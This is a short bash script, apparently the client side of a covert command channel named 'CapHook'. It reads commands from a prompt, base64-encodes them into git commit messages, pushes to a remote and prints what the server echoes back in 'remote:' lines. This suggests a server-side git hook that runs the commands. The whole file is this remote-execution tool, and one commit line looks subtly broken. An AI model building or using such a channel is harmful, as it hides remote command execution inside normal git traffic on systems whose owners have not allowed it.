#!/bin/bash

while true; do
    echo "CapHook> "
    read command
    encode=$(echo ${command} | base64)
    echo ${encode}
    touch $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1)
    git add -A > /dev/null
    git commit -m ${encode} /dev/null
    git push | grep "remote: " | awk '{print $2}'
done
